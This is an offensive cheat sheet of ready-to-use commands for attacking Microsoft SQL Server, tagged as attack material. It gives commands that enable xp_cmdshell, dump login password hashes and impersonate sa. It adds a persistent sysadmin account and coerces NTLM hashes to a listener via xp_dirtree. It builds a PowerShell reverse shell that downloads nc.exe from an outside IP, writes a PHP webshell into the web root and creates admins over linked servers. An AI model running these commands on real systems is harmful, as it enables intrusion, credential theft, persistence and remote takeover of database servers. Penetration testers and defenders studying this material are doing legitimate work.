# mssql-cmd

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/sql  #port/1433 #cat/ATTACK



## configure - turns on advanced options
```
sp_configure 'show advanced options', '1'
RECONFIGURE
```

## configure -  enable xp_cmdshell 
```
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

## configure -  enable Ole Automation Procedures
```
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
```

## enum - Get databases
master, tempdb, model, msdb arr default DB
```
SELECT name FROM master.dbo.sysdatabases
```

## enum - Get tables of a databases
```
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
```

## enum - select records of a table
```
SELECT * FROM <databaseName>.dbo.<tableName>
```

## enum - Get users
```
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

## enum - check admin rights
```
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## enum - identify users that we can impersonate
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

## enum - check readfile priv (OPENROWSET)
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```

## privesc - impersonate user
```
EXECUTE AS LOGIN = '<user|sa>'
```

## persist - Create user with sysadmin privs
```
CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!'
sp_addsrvrolemember 'jubeaz', 'sysadmin'
```

## execute command
```
EXEC master..xp_cmdshell '<cmd|whoami /all>'
```
## Hash gathering - 
sudo impacket-smbserver share ./ -smb2support
sudo responder -I tun0
```
xp_dirtree '\\<ip>\any\thing'
exec master.dbo.xp_dirtree '\\<ip>\any\thing'
EXEC master..xp_subdirs '\\<ip>\anything\'
EXEC master..xp_fileexist '\\<ip>\anything\'
```

## reverseshell
'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```
exec xp_cmdshell 'powershell -exec bypass -enc <b64_payload>
```


## read file (OPENROWSET)
```
SELECT * FROM OPENROWSET(BULK N'<path|C:/Windows/System32/drivers/etc/hosts>', SINGLE_CLOB) AS Contents
```

## write file
enable Ole Automation Procedures
```
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

## Trustable Links - Get Linked Servers (exec)
```
EXEC sp_linkedservers
```

## Trustable Links - Get Linked Servers (select)
```
select * from master..sysservers
```

## Trustable Links - Execute queries
```
select * from openquery("<srvname>", '<query>')
```

## Trustable Links - Get databases
master, tempdb, model, msdb arr default DB
```
SELECT * FROM OPENQUERY("<srvname>",'SELECT name FROM master.dbo.sysdatabases')
SELECT name FROM master.dbo.sysdatabases
```

## enum - Get tables of a databases
```
SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES')
```

## Trustable Links - select records of a table
```
SELECT * FROM OPENQUERY("<srvname>",'SELECT * FROM <databaseName>.dbo.<tableName>')
```

## Trustable Links - create remote admin
```
EXECUTE('EXECUTE(''CREATE LOGIN <login|jubeaz> WITH PASSWORD = ''''<password|Jub@z123!>'''' '') AT "<remote_srvname>"') AT "<local_srvname>"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''<login|jubeaz>'''' , ''''sysadmin'''' '') AT "<remote_srvname>"') AT "<local_srvname>"
```

